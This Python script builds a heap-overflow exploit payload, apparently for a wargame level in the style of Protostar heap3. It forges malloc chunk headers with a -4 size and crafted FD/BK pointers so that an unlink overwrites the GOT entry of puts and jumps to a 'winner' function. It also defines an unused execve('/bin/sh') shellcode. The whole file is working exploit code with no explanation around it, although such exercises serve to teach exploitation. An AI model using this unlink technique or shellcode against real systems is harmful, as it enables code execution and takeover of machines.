import sys

SEP = b' '

NOT_IMPORTANT_DWORD_WITH_LAST_BIT_OFF = b'\x10'*4
SIZE_BIGGER_THAN_MAX_FAST_WITH_INUSE_ON = b'\x4d'
MINUS4 = b'\xfc\xff\xff\xff'

# *(BK + 8) = FD
# *(FD + 12) = BK

# winner = 0x80487d5
# puts  = 0x804c13c (-8)
# address right after FD and BK in heap : 0xf7e690ac
BK = b'\x34\xc1\x04\x08'
FD = b'\xac\x90\xe6\xf7'

JMP_PLUS18 = b'\xeb\x12'
JMP_WINNER = b'\xea\xd5\x87\x04\x08\x23'

PAYLOAD_WINNER = JMP_WINNER
PAYLOAD_SHELL = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'

ARG1 = b'1' + SEP
ARG2 = b'B'*32 + NOT_IMPORTANT_DWORD_WITH_LAST_BIT_OFF + SIZE_BIGGER_THAN_MAX_FAST_WITH_INUSE_ON + SEP
ARG3 = b'C'*0x44 + NOT_IMPORTANT_DWORD_WITH_LAST_BIT_OFF + \
    MINUS4 + FD + BK + JMP_PLUS18 + b'C' * 18 + PAYLOAD_WINNER


sys.stdout.buffer.write(ARG1 + ARG2 + ARG3)
